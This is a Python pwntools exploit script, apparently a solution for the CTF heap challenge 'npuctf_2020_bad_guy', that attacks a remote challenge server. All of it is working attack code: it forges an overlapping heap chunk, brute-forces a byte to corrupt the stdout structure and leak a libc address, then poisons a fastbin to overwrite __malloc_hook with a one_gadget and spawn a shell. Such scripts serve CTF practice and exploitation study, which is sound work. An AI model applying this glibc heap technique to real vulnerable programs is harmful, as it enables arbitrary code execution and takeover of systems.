from pwn import *
# from parse_args_and_some_func import *
LOG_ADDR = lambda x, y: info("{} ===> {}".format(x, hex(y)))
int16 = lambda x: int(x, base=16)

# sh =process("./npuctf_2020_bad_guy")
# sh = all_parsed_args['io']
sh = remote("node3.buuoj.cn", 27654)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.arch = "amd64"

gadgets = [0x45226, 0x4527a, 0xf0364, 0xf1147]


def add(idx, size, data="a"):
    sh.sendlineafter(">> ", "1")
    sh.sendlineafter("Index :", str(idx))
    sh.sendlineafter("size: ", str(size))
    sh.sendafter("Content:", data)


def edit(idx, size, data="a"):
    sh.sendlineafter(">> ", "2")
    sh.sendlineafter("Index :", str(idx))
    sh.sendlineafter("size: ", str(size))
    sh.sendafter("content: ", data)


def free(idx):
    sh.sendlineafter(">> ", "3")
    sh.sendlineafter("Index :", str(idx))



def attack(mode = 0):
    # hijack stdout
    add(0, 0x10)
    add(1, 0x10)
    add(2, 0x60)
    add(3, 0x10)

    free(2)

    # fake size
    edit(0, 0x20, b"a" * 0x18 + p64(0x91))

    free(1)

    add(1, 0x10)

    if mode == 0:
        num = input("please input one byte(hex):")
    else:
        num = "0x55"

    edit(1, 0x30, b"a" * 0x18 + p64(0x71) + p8(0xdd) + p8(int16(num)))

    add(2, 0x60)
    layout = [0x33 * "\x00", 0xfbad1800, 0, 0, 0, "\x58"]
    add(3, 0x60, flat(layout))

    msg = sh.recvn(8)

    leak_libc_addr = u64(msg)
    libc_base_addr = leak_libc_addr - 0x3c56a3

    LOG_ADDR("libc_base_addr", libc_base_addr)
    # STOP()
    libc.address = libc_base_addr

    free(2)

    edit(1, 0x30, b"a" * 0x18 + p64(0x71) + p64(libc.sym["__malloc_hook"] - 0x23))
    # STOP()
    add(2, 0x60)

    one_gadget = libc.offset_to_vaddr(gadgets[3])

    payload = b"a" * 0x13 + p64(one_gadget)

    add(4, 0x60, payload)

    sh.sendlineafter(">> ", "1")
    sh.sendlineafter("Index :", str(5))
    sh.sendlineafter("size: ", str(0x10))

    sh.interactive()


if __name__ == '__main__':
    while True:
        try:
            attack(1)
            break
        except:
            sh.close()
            # sh = process("./npuctf_2020_bad_guy")
            sh = remote("node3.buuoj.cn", 27654)
        
    